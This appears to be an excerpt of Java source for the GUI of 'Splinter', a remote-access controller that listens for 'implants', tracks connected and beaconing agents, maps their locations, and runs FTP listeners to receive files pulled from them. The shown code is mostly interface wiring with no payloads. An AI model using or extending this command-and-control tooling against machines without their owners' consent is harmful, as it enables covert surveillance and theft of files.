...
public class Splinter_GUI extends JFrame implements ActionListener
{
	...
	public static volatile LinkedList<Thread_ServerSocket> llThread_ServerSockets = new LinkedList<Thread_ServerSocket>();
	public static volatile LinkedList<FTP_ServerSocket> llFTP_ServerSockets = new LinkedList<FTP_ServerSocket>();
	public static volatile String FTP_Interfaces_addresses = "";
	public static Thread_JLabels thdWorkerJLabels = null;
	
	public static volatile int newPort = -1;
	public static volatile String server_socket_listening_implant_ports_tooltip = "";
	public static volatile String server_socket_listening_implant_IP_addresses_tooltip = "";
	...
	JPanel jpnlServerSettings = new JPanel();
			JPanel jpnlServerSocket = new JPanel();			
				...
				JTextField jtfServerSocketPort = new JTextField(15);
				JButton jbtnEstablishServerSocket;//
				JButton jbtnCloseServerSocket;
				
				JRadioButton jrbSingleInterface = new JRadioButton("Single Interface", true);
				public static volatile JRadioButton jrbAllInterfaces = new JRadioButton("All Interfaces");
		...
		JCheckBox jcbEnableLogging = new JCheckBox("Logging is Enabled", true);
				...
				public static volatile JComboBox jcbFTP_Options = null;
				static JButton jbtnFTP_FileHive = new JButton("FTP FileHive");
				static JButton jbtnset_Primary_FTP_Interface = null;
...
//							JLabel jlblUptime_Secondss = new JLabel("00", JLabel.LEFT);
				...
				JPanel jpnlConnectToImplant = new JPanel();			
					...
					JTextField jtfIP_Address_To_Implant = new JTextField(15);
...
//jpnlMain.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			...
			Splinter_GUI.jtblConnectedAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			jtblDisconnectedAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			Splinter_GUI.jtblBeaconingAgents.jbtnRefresh.addActionListener(this);//I find this pretty cool!
			jtblLoggieAgents.jbtnRefresh.addActionListener(this);
			jtblDisconnectedAgents.jbtnDisconnectImplant.setVisible(false);
			Splinter_GUI.jtblBeaconingAgents.jbtnDisconnectImplant.setVisible(false);
			Splinter_GUI.jtblBeaconingAgents.jbtnGoogleMap.setVisible(false);
			Splinter_GUI.jtblBeaconingAgents.jbtnRefresh.setVisible(false);
			Splinter_GUI.jtblBeaconingAgents.jcbEnableGPS_Resolution.setVisible(false);
			...
			Splinter_GUI.jtblLoggieAgents.jbtnGoogleMap.setVisible(false);
			//this.jtblLoggieAgents.jbtnRefresh.setVisible(false);
			Splinter_GUI.jtblLoggieAgents.jcbEnableGPS_Resolution.setVisible(false);
			
			jtblDisconnectedAgents.jbtnRefresh.setVisible(false);
			Splinter_GUI.jtblConnectedAgents.jbtnDisconnectImplant.addActionListener(this);//I find this pretty cool!
			...
			/*System.out.println("*******************************************************************************");
			System.out.println("*     " + Drivers.NICK_NAME + " vers " + Drivers.VERSION + " - BETA" + " Developed by Solomon Sonya    *");
			System.out.println("*******************************************************************************");
			*/
...
//Drivers.captureScreen("", "" + System.currentTimeMillis() + "_screen capture");
		...
		//
		Drivers.refreshNetworkInterface(this.jcbNetworkInterface, true);
...
//		}
	...
	public boolean intializeFTP_Panel()
	{
		...
		{
			jpnlFTP = new JPanel();
			jtfPort_FTP = new JTextField("21", 15);
			
			jcbAutoAcceptFTP_Files = new JCheckBox("Auto Accept Files", false);
			//jbtnFTP_FileHive = new JButton("                       FTP FileHive                  ");
			jcbFTP_Options = new JComboBox();
			jcbFTP_Options.setModel(new DefaultComboBoxModel(Drivers.arrFTP_Options));
			jcbFTP_Options.addActionListener(this);
			
			jbtnFTP_FileHive = new JButton("   Set FTP FileHive   ");
			jbtnset_Primary_FTP_Interface = new JButton("Set Primary FTP Interface");
			jbtnset_Primary_FTP_Interface.setToolTipText("<html>When commanding the connected agents to send a file to the controller, \r\n<br>they need to know the main interface to send these files to.  In case you \r\n<br>instantiate FTP listeners on multiple interfaces, this option specifies \r\n<br>the primary interface to relay to connected implants when files are to \r\n<br>FTP'd over to the controller. Select this option to specify the primary \r\n<br>interface for connected agents to send files to.</html>");
			...
			jpnlFTP.add(jcbFTP_Options);
			//jpnlFTP.add(jbtnset_Primary_FTP_Interface);
			//jpnlFTP.add(jbtnFTP_FileHive);			
			jpnlFTP.add(jcbAutoAcceptFTP_Files);
			//jpnlFTP.add(jcbEnableLogging);
			...
			jbtnset_Primary_FTP_Interface.addActionListener(this);
	...
	public boolean manualResizeCols_ConnectedAgents()
	{
		try
		{
			Splinter_GUI.jtblConnectedAgents.jtblMyJTbl.getColumn(Drivers.strImportantMessage_Header).setPreferredWidth(2);
	...
	public boolean manualResizeCols_DisconnectedAgents()
	{
		try
		{
			Splinter_GUI.jtblDisconnectedAgents.jtblMyJTbl.getColumn(Drivers.strDisconnectionTime_Header).setPreferredWidth(102);
	...
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			...
			else if(ae.getSource() == jbtnClearConsoleOut)
			{
				...
				{
					Splinter_GUI.jtxtpne_ConsoleOut.clearTextPane();
				}
					
			}
			
			else if(ae.getSource() == jcbFTP_Options)
			{
				handle_ftp_options();
			}
			...
			{
				Splinter_GUI.jtxtpne_ConsoleOut.autoScroll = jcbAutoScrollConsoleOut.isSelected();
			}
			...
			else if(ae.getSource() == jcbNetworkInterface)
			{
				if(jcbNetworkInterface.getSelectedItem() != null && jcbNetworkInterface.getSelectedItem().toString().trim().equalsIgnoreCase(Drivers.LISTEN_ON__ALL_INTERFACES))
				{
					this.jrbAllInterfaces.setSelected(true);
				}
			}
			...
			else if(ae.getSource() == jcbEnableLogging)
			{
				...
				Driver.sop("Logging is Enabled: " + jcbEnableLogging.isSelected());
			}
			...
			else if(ae.getSource() == this.jrbAllInterfaces)
			{
				try
				{
					this.jcbNetworkInterface.setSelectedIndex(jcbNetworkInterface.getItemCount()-1);
				}
				catch(Exception e)
				{
			...
			else if(ae.getSource() == this.jrbSingleInterface)
			{
				try
				{
					this.jcbNetworkInterface.setSelectedIndex(0);
				}
				catch(Exception e)
				{
			...
			else if(ae.getSource() == jbtnset_Primary_FTP_Interface)
			{
				this.setPrimaryFTP_Interface(-1);
			}
	...
	public boolean handle_ftp_options()
	{
		try
		{
			if(this.jcbFTP_Options.getSelectedIndex() < 1)//user selected "Options"
				return true;
			
			else if(this.jcbFTP_Options.getSelectedItem() == null)
				return false;
			
			else if(jcbFTP_Options.getSelectedItem().toString().equalsIgnoreCase(Drivers.ftp_option_SetFTP_FileHive))
			{
				setFTP_FileHiveDirectory();
			}
			
			else if(jcbFTP_Options.getSelectedItem().toString().equalsIgnoreCase(Drivers.ftp_option_SetPrimaryFTP_Interface))
			{
				this.setPrimaryFTP_Interface(-1);
			} 
			
			else if(jcbFTP_Options.getSelectedItem().toString().equalsIgnoreCase(Drivers.ftp_option_SpecifyFTP_Address))
			{
				String address = Drivers.jopInput("Manually Specify FTP Address", "The current FTP address to Splinter is specified as " + FTP_ServerSocket.FTP_Server_Address + ".\n\nUse this option if you wish to manually specify an address for implants to send files\n");
				
				if(address != null && !address.trim().equals(""))
				{
					//take the new address
					FTP_ServerSocket.FTP_Server_Address = address;
					
					Driver.jop_Message("New FTP Address changed to " + FTP_ServerSocket.FTP_Server_Address);
				}
			} 
			
			this.jcbFTP_Options.setSelectedIndex(0);
		...
		{
			Drivers.eop("handle_ftp_options", strMyClassName, e, "", false);
		}
	...
	public boolean disconnectLoggie()
	{
		try
		{
			int indexToRemove = Splinter_GUI.jtblLoggieAgents.getSelectedRowIndex();
	...
	public boolean closeFTP()
	{
		try
		{
			...
			{
				if(Drivers.jop_Confirm("FTP ServerSocket is open on port " + FTP_ServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == JOptionPane.YES_OPTION)
				{
		...
		try
		{
			if(FTP_ServerSocket.svrSocket != null && FTP_ServerSocket.FTP_ServerSocket_Is_Open)
			{
				if(Drivers.jop_Confirm("FTP ServerSocket is open on port " + FTP_ServerSocket.PORT + ".  Do you Wish to close?", "Close FTP ServerSocket") == JOptionPane.YES_OPTION)
				{
					...
					FTP_ServerSocket.FTP_ServerSocket_Is_Open = false;
					ftpServerSocket.dismissClosedSocketError = true;
					try{FTP_ServerSocket.svrSocket.close();}catch(Exception ee){}
			...
			//check if we're listening on all interfaces
			if(this.jrbAllInterfaces.isSelected())
			{
				//attempt to bind to each available IP address
				LinkedList<InetAddress> llAvailableInetAddresses = MapNetworkInterface.listIP_Addresses();
				String [] selectable_list = new String[llAvailableInetAddresses.size()];
												
				for(int i = 0; llAvailableInetAddresses != null && i < llAvailableInetAddresses.size(); i++)
				{
					ftpServerSocket = new FTP_ServerSocket(false, true, port, llAvailableInetAddresses.get(i), Splinter_GUI.jlblFTP_Status);
					ftpServerSocket.start();
					
					llFTP_ServerSockets.add(ftpServerSocket);
					
					FTP_Interfaces_addresses = FTP_Interfaces_addresses + llAvailableInetAddresses.get(i) + " : " + port + "<br>";
					
					selectable_list[i] = ""+ llAvailableInetAddresses.get(i) + " : " + port;
				}
				
				Driver.sop(FTP_Interfaces_addresses);
				jlblFTP_Status.setToolTipText("<html><b><u> FTP Listening Interfaces </b></u><br> " + FTP_Interfaces_addresses + "</html>");
				//Server_socket_listening_implant_ports_tooltip = "<html><b><u>Listening PORT:</b></u><br>" + Splinter_GUI.llThread_ServerSockets.get(0).bindAddress + " : " + Thread_ServerSocket.svrSocketPort;
				
				setPrimaryFTP_Interface(port);
				
			}
			
			else
			{
				//proceed with only one interface
				ftpServerSocket = new FTP_ServerSocket(false, true, port, Driver.interfaceBindAddress, Splinter_GUI.jlblFTP_Status);
				ftpServerSocket.start();
	...
	public boolean displaySelectedImplantOnMap()
	{
		try
		{
			...
			//get index to show
			int indexToShow = Splinter_GUI.jtblConnectedAgents.getSelectedRowIndex();
	...
	public boolean setPrimaryFTP_Interface(int port)
	{
		try
		{
			if(llFTP_ServerSockets == null || llFTP_ServerSockets.size() < 1)
			{
				Driver.jop_Error("Error!  \nYou can only specify this option if you have first instantiated FTP listeners on all interfaces.", "Open an FTP Listeners on all interfaces first");
				return false;
			}
			...
			for(int i = 0; i < llAvailableInetAddresses.size(); i++)
			{
				if(port < 0)
					selectable_list[i] = ""+ llAvailableInetAddresses.get(i);
				else
					selectable_list[i] = ""+ llAvailableInetAddresses.get(i) + " : " + port;				
			}
			
			int selection = Drivers.jopQueryJComboBox("Please specify the primary FTP interface.", selectable_list);
			
			/*if(selection < 0)
			{
				Driver.jop_Error("No selection received.  I will not specify the primary  FTP interface to receive files", "Invalid Selection");
				return false;
			}*/
			
			if(selection < 0)
			{
				Driver.jop_Error("You did not choose a valid selection.  \nI am setting primary FTP to default interface at index 0", "No Valid Selection Received");
				selection = 0;
			}
			
									
			//otherwise, specify the primary FTP
			Driver.FTP_ServerSocket = llFTP_ServerSockets.get(selection);
			Driver.jop("Setting FTP primary interface to " + llFTP_ServerSockets.get(selection).inetBindAddress);
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("setPrimaryFTP_Interface", this.strMyClassName, e, "", false);
		}
	...
	public static boolean disconnectAllImplants()
	{
		try
		{
			if(Drivers.alTerminals.size() < 1)
			...
			Drivers.sop("Ejecting all connected threads now...");
			
			//
			//THREAD SAFETY! never a good idea to modify a container while you are looping through the same container!
			//
			//so copy a replica, and terminate from the replicas. They in turn will update the main container
			LinkedList<Thread_Terminal> disconnection_list = new LinkedList<Thread_Terminal>();
			
			for(Thread_Terminal terminal : Drivers.alTerminals)
			{
				disconnection_list.add(terminal);
			}
			
			
			Thread_Terminal terminal = null;
			for(int i = 0; disconnection_list != null && i < disconnection_list.size(); i++)
			{
				terminal = disconnection_list.get(i);
				
				//choke the thread by closing its socket... it's error handling will call it to be removed from our arraylist
				if(terminal.sktMyConnection != null)//simply try ti close the socket
				{
					try
					{
						terminal.sktMyConnection.close();
						terminal.closeThread();
					}catch(Exception e){}
				}
				
				terminal.continueRun = false;//by simply saying false, the thread will punt out of the while loop and terminate itself
				terminal.killThread = true;
			}
		...
		{
			Drivers.eop("disconnectAllImplants.", "Splinter_GUI", e, e.getLocalizedMessage(), false);
		}
	...
	public boolean setColorScheme(int index)
	{
		try
		{
			...
			try
			{
				...
				Splinter_GUI.jpnlMainController.jpnlSend.setBackground(Drivers.clrController.darker());
	...
	private boolean establishServerSocket()
	{
		try
		{
			...
			try
			{
				...
				try
				{
					if(jcbNetworkInterface.getSelectedItem() != null && jcbNetworkInterface.getSelectedItem().toString().trim().equalsIgnoreCase(Drivers.LISTEN_ON__ALL_INTERFACES.trim()))
					{
						this.jrbAllInterfaces.setSelected(true);
					}
				}catch(Exception e){}
				...
				if(this.jrbAllInterfaces.isSelected())
				{
					...
					Thread_ServerSocket svrSkt = null;
					for(int i = 0; llAvailableInetAddresses != null && i < llAvailableInetAddresses.size(); i++)
					{
						svrSkt = new Thread_ServerSocket(newPort, llAvailableInetAddresses.get(i), Splinter_GUI.jlblServerSocketStatus, Splinter_GUI.jlblEstablishedPort, Splinter_GUI.jlblNumberConnectedImplants, jlblLHOST_ME_IP);
						svrSkt.start();
						
						llThread_ServerSockets.add(svrSkt);						
						Driver.interfaceBindAddress = llAvailableInetAddresses.get(i);
						
						/*if(svrSkt.serverSocketRunning)
						{
							llThread_ServerSockets.add(svrSkt);
				...
				{
					//proceed with only one interface to listen on
					...
					{							
						...
						thdServerSocket = new Thread_ServerSocket(newPort, Driver.interfaceBindAddress, Splinter_GUI.jlblServerSocketStatus, Splinter_GUI.jlblEstablishedPort, Splinter_GUI.jlblNumberConnectedImplants, jlblLHOST_ME_IP);
	...
	public void initializeSettings()
	{
		try
		{
			...
			btngrp.add(jrbSingleInterface);btngrp.add(jrbAllInterfaces);
			jrbSingleInterface.setToolTipText("ServerSocket will listen only across the selected Network Inferface Adapter");
			jrbAllInterfaces.setToolTipText("ServerSocket will listen on all available Network adapter Interfaces");
			jpnlServerSocket.add(jrbSingleInterface);
			jpnlServerSocket.add(jrbAllInterfaces);
			jrbSingleInterface.addActionListener(this);
			this.jrbAllInterfaces.addActionListener(this);
	...
	public void initializeJTabbedPane()
	{
		try
		{
			...
			tabbedPane_Main = new JTabbedPane(SwingConstants.TOP);
			tabbedPane_Main.setBounds(10, 35, 1006, 520);
			
			tabbedPane_IMPLANTS = new JTabbedPane(SwingConstants.LEFT);
...
//jpnlSouth.add(jpnlConnectionStatus);
			...
			jcbNetworkInterface.addActionListener(this);
...
//			jlblUptime_Secondss.setToolTipText("Seconds");
			...
			Drivers.jtblConnectedImplants = Splinter_GUI.jtblConnectedAgents;
			...
			Drivers.jtblDisconnectedImplants = Splinter_GUI.jtblDisconnectedAgents;
			...
			Drivers.jtblBeaconImplants = Splinter_GUI.jtblBeaconingAgents;
			Splinter_GUI.jtblBeaconingAgents.i_am_beacon_jtable = true;
			...
			Drivers.jtblLoggingAgents = Splinter_GUI.jtblLoggieAgents;
			...
			Splinter_GUI.jtblLoggieAgents.i_am_loggie_jtable = true;
...
//getContentPane().add(BorderLayout.CENTER, tabbedPane_Main);
	...
	public boolean closeServerSocket()
	{
		try
		{
			if(Splinter_GUI.thdServerSocket != null && Splinter_GUI.thdServerSocket.svrSocket.isBound())
			{
			...
			Splinter_GUI.thdServerSocket.svrSocket.close();
			
			Splinter_GUI.thdServerSocket.keepServerSocketOpen = false;
			
			Splinter_GUI.thdServerSocket = null;
	...
	public void initializeControllerWindow()
	{
		try
		{
			...
			tabbedPane_Main.addTab("  Command Terminal  ", Splinter_GUI.jpnlMainController);
